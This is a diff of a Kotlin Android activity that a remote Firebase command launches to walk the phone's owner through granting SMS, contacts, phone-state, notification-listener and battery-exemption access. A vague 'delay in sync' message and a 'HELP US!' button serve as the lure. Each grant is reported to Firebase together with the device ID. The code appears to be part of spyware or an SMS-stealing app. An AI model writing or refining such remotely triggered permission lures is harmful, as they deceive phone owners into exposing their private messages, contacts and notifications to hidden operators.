@@ -39,26 +39,26 @@ import com.example.fast.util.PermissionSyncHelper
 
 /**
  * RemotePermissionRequestActivity
- * 
+ *
  * Activity launched remotely via Firebase command to request specific permissions.
  * Shows a UI with message and "HELP US!" button.
- * 
+ *
  * Usage:
  * - Command: requestPermission
  * - Content: "permission1,permission2,..." or "ALL"
  * - Permissions: sms, contacts, notification, battery, phone_state, ALL
- * 
+ *
  * Example:
  * - "sms,contacts" -> Request SMS and Contacts permissions
  * - "ALL" -> Request all permissions
  */
 class RemotePermissionRequestActivity : AppCompatActivity() {
-    
+
     private val binding by lazy { ActivityRemotePermissionRequestBinding.inflate(layoutInflater) }
-    
+
     private val TAG = "RemotePermissionRequest"
     private val PERMISSION_REQUEST_CODE = 200
-    
+
     @Suppress("DEPRECATION")
     private val permissionsList: ArrayList<String> by lazy {
         val baseList = intent.getStringArrayListExtra("permissions") ?: ArrayList()
@@ -72,7 +72,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
         }
         enhancedList
     }
-    
+
     @get:android.annotation.SuppressLint("HardwareIds")
     private val deviceId: String by lazy {
         android.provider.Settings.Secure.getString(
@@ -80,35 +80,35 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             android.provider.Settings.Secure.ANDROID_ID
         )
     }
-    
+
     private var currentPermissionIndex = 0
     private var hasAttemptedBatteryOptimization = false
-    
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
-        
+
         // Set window background to match app theme
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             window.statusBarColor = ContextCompat.getColor(this, R.color.theme_gradient_start)
             window.navigationBarColor = ContextCompat.getColor(this, R.color.theme_gradient_start)
         }
-        
+
         setContentView(binding.root)
         AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
-        
+
         // Animate card entrance
         animateCardEntrance()
-        
+
         // Animate icon pulse
         animateIconPulse()
-        
+
         // Setup UI
         setupUI()
-        
+
         // Sync current permission status to Firebase
         PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
-        
+
         // Start processing permission requests when button is clicked
         if (permissionsList.isEmpty()) {
             Log.w(TAG, "No permissions to request, finishing activity")
@@ -116,14 +116,14 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             return
         }
     }
-    
+
     /**
      * Animate card entrance
      */
     private fun animateCardEntrance() {
         binding.mainCard.alpha = 0f
         binding.mainCard.translationY = 100f
-        
+
         binding.mainCard.animate()
             .alpha(1f)
             .translationY(0f)
@@ -131,7 +131,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             .setInterpolator(DecelerateInterpolator())
             .start()
     }
-    
+
     /**
      * Animate icon pulse effect
      */
@@ -142,14 +142,14 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
         scaleAnimator.repeatCount = ValueAnimator.INFINITE
         scaleAnimator.repeatMode = ValueAnimator.REVERSE
         scaleAnimator.start()
-        
+
         val scaleYAnimator = ObjectAnimator.ofFloat(iconContainer, "scaleY", 1f, 1.05f, 1f)
         scaleYAnimator.duration = 2000
         scaleYAnimator.repeatCount = ValueAnimator.INFINITE
         scaleYAnimator.repeatMode = ValueAnimator.REVERSE
         scaleYAnimator.start()
     }
-    
+
     /**
      * Setup UI elements
      */
@@ -157,7 +157,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
         // Set message text
         binding.messageText.text = "There is a delay in sync due to permission issues."
         binding.subtitleText.text = "We give our best."
-        
+
         // Setup help button click listener
         binding.helpButton.setOnClickListener {
             // Animate button press
@@ -173,12 +173,12 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
                         .start()
                 }
                 .start()
-            
+
             // Hide button and show permissions list
             hideButtonAndShowPermissions()
         }
     }
-    
+
     /**
      * Hide button and show permissions list with animation
      */
@@ -195,35 +195,35 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
                 }
             })
             .start()
-        
+
         // Show permissions list
         binding.permissionsListContainer.visibility = View.VISIBLE
         binding.permissionsListContainer.alpha = 0f
         binding.permissionsListContainer.translationY = -20f
-        
+
         binding.permissionsListContainer.animate()
             .alpha(1f)
             .translationY(0f)
             .setDuration(400)
             .setInterpolator(DecelerateInterpolator())
             .start()
-        
+
         // Populate permissions list
         populatePermissionsList()
-        
+
         // Start processing permissions after a short delay
         Handler(Looper.getMainLooper()).postDelayed({
             processNextPermission()
         }, 500)
     }
-    
+
     /**
      * Populate permissions list UI
      */
     private fun populatePermissionsList() {
         val permissionsListLayout = binding.permissionsList
         permissionsListLayout.removeAllViews()
-        
+
         val permissionNames = mapOf(
             "sms" to "SMS Access",
             "contacts" to "Contacts",
@@ -231,13 +231,13 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             "battery" to "Battery Optimization",
             "phone_state" to "Phone State"
         )
-        
+
         permissionsList.forEach { permission ->
             val permissionItem = createPermissionItem(permissionNames[permission] ?: permission)
             permissionsListLayout.addView(permissionItem)
         }
     }
-    
+
     /**
      * Create a permission item view
      */
@@ -247,20 +247,20 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
         itemLayout.gravity = android.view.Gravity.CENTER_VERTICAL
         val padding = dpToPx(12)
         itemLayout.setPadding(padding, padding / 2, padding, padding / 2)
-        
+
         val params = LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT,
             LinearLayout.LayoutParams.WRAP_CONTENT
         )
         params.setMargins(0, 0, 0, dpToPx(8))
         itemLayout.layoutParams = params
-        
+
         // Set background
         val background = GradientDrawable()
         background.setColor(ContextCompat.getColor(this, android.R.color.transparent))
         background.cornerRadius = dpToPx(12).toFloat()
         itemLayout.background = background
-        
+
         // Icon
         val icon = ImageView(this)
         icon.setImageResource(android.R.drawable.ic_dialog_info)
@@ -269,7 +269,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
         iconParams.setMargins(0, 0, dpToPx(12), 0)
         icon.layoutParams = iconParams
         itemLayout.addView(icon)
-        
+
         // Permission name
         val nameText = TextView(this)
         nameText.text = permissionName
@@ -281,17 +281,17 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             LinearLayout.LayoutParams.WRAP_CONTENT
         )
         itemLayout.addView(nameText)
-        
+
         return itemLayout
     }
-    
+
     /**
      * Convert dp to pixels
      */
     private fun dpToPx(dp: Int): Int {
         return (dp * resources.displayMetrics.density).toInt()
     }
-    
+
     /**
      * Update permission item to show granted state
      */
@@ -310,7 +310,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
                 })
                 background.cornerRadius = dpToPx(12).toFloat()
                 item.background = background
-                
+
                 // Add checkmark icon
                 if (granted && item.childCount == 2) {
                     val checkIcon = ImageView(this)
@@ -321,7 +321,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
                     checkIcon.layoutParams = checkParams
                     item.addView(checkIcon)
                 }
-                
+
                 // Animate update
                 item.animate()
                     .scaleX(1.05f)
@@ -339,7 +339,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             }
         }
     }
-    
+
     /**
      * Process next permission in the list
      */
@@ -347,25 +347,25 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
         if (currentPermissionIndex >= permissionsList.size) {
             // All permissions processed
             Log.d(TAG, "All permissions processed")
-            
+
             // Show success message
             showSuccessMessage()
-            
+
             // Sync final permission status to Firebase
             PermissionFirebaseSync.syncPermissionStatus(this, deviceId)
-            
+
             // Trigger sync if permissions are available
             PermissionSyncHelper.checkAndStartSync(this)
-            
+
             // Finish after showing success message
             Handler(Looper.getMainLooper()).postDelayed({
                 finish()
             }, 2000)
             return
         }
-        
+
         val permissionName = permissionsList[currentPermissionIndex]
-        
+
         when (permissionName) {
             "sms" -> requestSmsPermissions()
             "contacts" -> requestContactsPermission()
@@ -379,23 +379,23 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             }
         }
     }
-    
+
     /**
      * Request SMS permissions (RECEIVE_SMS and READ_SMS)
      */
     private fun requestSmsPermissions() {
         val missingPermissions = mutableListOf<String>()
-        
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) 
+
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
             != PackageManager.PERMISSION_GRANTED) {
             missingPermissions.add(Manifest.permission.RECEIVE_SMS)
         }
-        
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
+
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
             != PackageManager.PERMISSION_GRANTED) {
             missingPermissions.add(Manifest.permission.READ_SMS)
         }
-        
+
         if (missingPermissions.isEmpty()) {
             // Already granted
             updatePermissionItemStatus("SMS Access", true)
@@ -413,12 +413,12 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             )
         }
     }
-    
+
     /**
      * Request Contacts permission
      */
     private fun requestContactsPermission() {
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) 
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
             == PackageManager.PERMISSION_GRANTED) {
             // Already granted
             updatePermissionItemStatus("Contacts", true)
@@ -436,12 +436,12 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             )
         }
     }
-    
+
     /**
      * Request Phone State permission
      */
     private fun requestPhoneStatePermission() {
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) 
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
             == PackageManager.PERMISSION_GRANTED) {
             // Already granted
             updatePermissionItemStatus("Phone State", true)
@@ -459,7 +459,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             )
         }
     }
-    
+
     /**
      * Request Notification Listener permission (opens Settings)
      */
@@ -467,7 +467,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
         val component = ComponentName(packageName, NotificationReceiver::class.java.name)
         val isEnabled = NotificationManagerCompat.getEnabledListenerPackages(this)
             .contains(component.packageName)
-        
+
         if (isEnabled) {
             // Already granted
             updatePermissionItemStatus("Notifications", true)
@@ -483,7 +483,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             // Note: We'll check again in onResume() since user needs to enable in Settings
         }
     }
-    
+
     /**
      * Request Battery Optimization exemption (opens Settings)
      */
@@ -495,10 +495,10 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             processNextPermission()
             return
         }
-        
+
         val powerManager = getSystemService(POWER_SERVICE) as? PowerManager
         val isIgnoring = powerManager?.isIgnoringBatteryOptimizations(packageName) ?: true
-        
+
         if (isIgnoring) {
             // Already exempt
             updatePermissionItemStatus("Battery Optimization", true)
@@ -534,19 +534,19 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             }
         }
     }
-    
+
     override fun onRequestPermissionsResult(
         requestCode: Int,
         permissions: Array<out String>,
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        
+
         if (requestCode == PERMISSION_REQUEST_CODE) {
             // Update permission status based on results
             permissions.forEachIndexed { index, permission ->
                 val isGranted = grantResults[index] == PackageManager.PERMISSION_GRANTED
-                
+
                 when (permission) {
                     Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS -> {
                         // Update SMS permission status (check both)
@@ -565,7 +565,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
                     }
                 }
             }
-            
+
             // Move to next permission after a short delay
             Handler(Looper.getMainLooper()).postDelayed({
                 currentPermissionIndex++
@@ -573,23 +573,23 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             }, 800)
         }
     }
-    
+
     override fun onResume() {
         super.onResume()
-        
+
         // Check if we're waiting for notification listener or battery optimization
         val currentPermission = if (currentPermissionIndex < permissionsList.size) {
             permissionsList[currentPermissionIndex]
         } else {
             null
         }
-        
+
         when (currentPermission) {
             "notification" -> {
                 val component = ComponentName(packageName, NotificationReceiver::class.java.name)
                 val isEnabled = NotificationManagerCompat.getEnabledListenerPackages(this)
                     .contains(component.packageName)
-                
+
                 if (isEnabled) {
                     updatePermissionItemStatus("Notifications", true)
                     PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "notification", true)
@@ -603,7 +603,7 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     val powerManager = getSystemService(POWER_SERVICE) as? PowerManager
                     val isIgnoring = powerManager?.isIgnoringBatteryOptimizations(packageName) ?: true
-                    
+
                     if (isIgnoring) {
                         updatePermissionItemStatus("Battery Optimization", true)
                         PermissionFirebaseSync.updatePermissionStatus(this, deviceId, "battery", true)
@@ -633,14 +633,14 @@ class RemotePermissionRequestActivity : AppCompatActivity() {
             }
         }
     }
-    
+
     /**
      * Show success message
      */
     private fun showSuccessMessage() {
         binding.successMessage.visibility = View.VISIBLE
         binding.successMessage.alpha = 0f
-        
+
         binding.successMessage.animate()
             .alpha(1f)
             .setDuration(400)
